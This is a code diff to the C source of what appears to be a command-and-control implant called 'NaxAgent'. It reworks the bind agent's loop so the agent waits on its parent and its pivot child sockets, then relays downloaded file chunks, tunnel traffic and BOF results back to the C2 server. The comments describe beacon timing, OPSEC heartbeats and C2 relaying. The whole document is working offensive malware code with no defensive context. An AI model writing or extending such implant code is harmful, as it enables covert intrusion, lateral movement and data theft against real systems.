@@ -617,29 +617,26 @@ void nax_tcp_bind_main(NaxAgent *a) {
         pthread_mutex_unlock(&g_sock_mutex);
 
         /*
-         * Heartbeat/task loop — event-driven with sleep.
+         * Passive slave loop — the parent drives the rhythm.
          *
-         * Protocol:
-         *   1. Sleep for effective_sleep_ms (mirrors beacon timing on C2 side)
-         *   2. Send HEARTBEAT to parent
-         *   3. Wait up to (sleep_ms + 3s) for parent to relay tasks back
-         *   4. If tasks arrive, dispatch and send results, then go to 1
-         *   5. If timeout (no tasks), go to 1
+         * The bind agent has no sleep of its own and never sends heartbeats
+         * unprompted.  Instead it blocks waiting for the parent to send data
+         * (tasks, CMD_SLEEP updates, etc.).  When it has pending results,
+         * download chunks, tunnel data or async BOF output it sends them
+         * immediately and then goes back to blocking.
          *
-         * The sleep BEFORE the heartbeat is critical: it gives the C2 time
-         * to process the previous result and queue the next task before the
-         * child asks again. Without it the child hammers the parent with
-         * heartbeats faster than the C2 can respond.
+         * This means the bind responds at exactly the parent's cycle rate —
+         * if the parent runs sleep=0 the bind is effectively interactive;
+         * if the parent runs sleep=5s the bind is slow.  No extra
+         * configuration is needed on the bind side.
+         *
+         * The parent (tcp.c process_pivots) reads from the bind socket with
+         * poll(0) on every cycle and relays whatever is available to the C2.
          */
         while (a->running) {
-            /* Step 1: Sleep before sending heartbeat */
-            uint32_t slp = effective_sleep_ms(a);
-            if (slp > 0) sleep_ms(slp);
+            /* --- flush any pending outbound data to the parent --- */
 
-            /* Tunnel processing handled by reader threads */
-            nax_opsec_heartbeat();
-
-            /* Relay download chunks — TCP cap 256 KB */
+            /* Download chunks */
             if (a->download_head) {
                 uint32_t cap = 256 * 1024 + 64;
                 uint8_t *dbuf = (uint8_t *)malloc(cap);
@@ -667,7 +664,8 @@ void nax_tcp_bind_main(NaxAgent *a) {
                 }
             }
 
-            { /* relay tunnels */
+            /* Tunnel relay */
+            {
                 uint8_t *tbuf = (uint8_t *)malloc(4*1024*1024);
                 if (tbuf) {
                     uint32_t tl = nax_process_tunnels_ex(a, tbuf, 4*1024*1024);
@@ -684,64 +682,54 @@ void nax_tcp_bind_main(NaxAgent *a) {
                 }
             }
 
-            /* Drain completed async BOF results */
+            /* Async BOF results */
             nax_bind_drain_async(a, cli);
 
-            /* Relay any pending pivot child data to the parent */
-            process_pivots_bind(a, cli);
+            nax_opsec_heartbeat();
 
-            /* Step 2: Send heartbeat */
-            DBG("sending HEARTBEAT");
-            if (do_heartbeat(a, cli) < 0) { DBG("HEARTBEAT send failed"); break; }
+            /* --- block until parent OR any pivot child has data --- */
+            /* Count pivot children */
+            int has_pending = (a->download_head != NULL);
+            int timeout_ms  = has_pending ? 50 : -1;
 
-            /* Step 3: Wait for parent to relay tasks.
-             * When sleep=0 (no delay mode) use 50ms so the agent stays
-             * responsive. Otherwise add 3s floor for slower C2 roundtrips. */
-            /* When downloads are active use a short poll so chunks flow quickly */
-            uint32_t poll_ms = (a->download_head) ? 100u :
-                               (slp == 0)          ? 50u  : slp + 3000u;
-            struct pollfd pfd = { .fd = cli, .events = POLLIN };
-            int pr = poll(&pfd, 1, (int)poll_ms);
+            /* Build pollfd array: slot 0 = parent, slots 1..N = pivot children */
+            int n_pivots = 0;
+            { NaxPivot *p = a->pivot_head; while (p) { n_pivots++; p = p->next; } }
 
-            if (pr < 0) { DBG("poll error"); break; }
+            struct pollfd *pfds = (struct pollfd *)malloc((1 + n_pivots) * sizeof(struct pollfd));
+            if (!pfds) break;
+            pfds[0].fd = cli; pfds[0].events = POLLIN; pfds[0].revents = 0;
+            {
+                int idx = 1; NaxPivot *p = a->pivot_head;
+                while (p && idx <= n_pivots) {
+                    pfds[idx].fd = p->sock; pfds[idx].events = POLLIN; pfds[idx].revents = 0;
+                    idx++; p = p->next;
+                }
+            }
+
+            int pr = poll(pfds, 1 + n_pivots, timeout_ms);
+
+            if (pr < 0) { free(pfds); DBG("poll error"); break; }
 
             if (pr == 0) {
-                DBG("poll timeout — no tasks from parent");
-                if (a->download_head) {
-                    uint32_t cap = 256 * 1024 + 64;
-                    uint8_t *dbuf = (uint8_t *)malloc(cap);
-                    if (dbuf) {
-                        uint32_t total = nax_process_downloads(a, dbuf, cap);
-                        uint32_t off = 0;
-                        while (off + 8 <= total) {
-                            uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
-                                          | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
-                            uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
-                                          | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
-                            off += 8;
-                            if (off + dlen > total) break;
-                            uint32_t frame_cap = dlen + 256;
-                            uint8_t *frame = (uint8_t *)malloc(frame_cap);
-                            if (frame) {
-                                uint32_t frame_len = frame_cap;
-                                if (nax_build_result(tid, NAX_STATUS_OK, dbuf + off, dlen, frame, &frame_len) == 0)
-                                    send_encrypted(a, cli, frame, frame_len);
-                                free(frame);
-                            }
-                            off += dlen;
-                        }
-                        free(dbuf);
-                    }
-                }
+                /* Timeout — only when has_pending; loop to flush */
+                free(pfds);
                 continue;
             }
 
-            if (pfd.revents & (POLLHUP | POLLERR)) {
+            /* Check pivot children first — relay their data to parent */
+            if (n_pivots > 0) {
+                process_pivots_bind(a, cli);
+            }
+
+            if (pfds[0].revents & (POLLHUP | POLLERR)) {
+                free(pfds);
                 DBG("parent disconnected (POLLHUP/POLLERR)");
                 break;
             }
 
-            if (pfd.revents & POLLIN) {
+            if (pfds[0].revents & POLLIN) {
+                free(pfds);
                 uint8_t *raw     = NULL;
                 uint32_t raw_len = 0;
                 if (tls_lp_recv(g_cli_ssl, &raw, &raw_len) < 0) { DBG("tls_lp_recv failed"); break; }
@@ -749,6 +737,8 @@ void nax_tcp_bind_main(NaxAgent *a) {
                 int rc = handle_parent_data(a, cli, raw, raw_len);
                 free(raw);
                 if (rc < 0) break;
+            } else {
+                free(pfds);
             }
         }
 
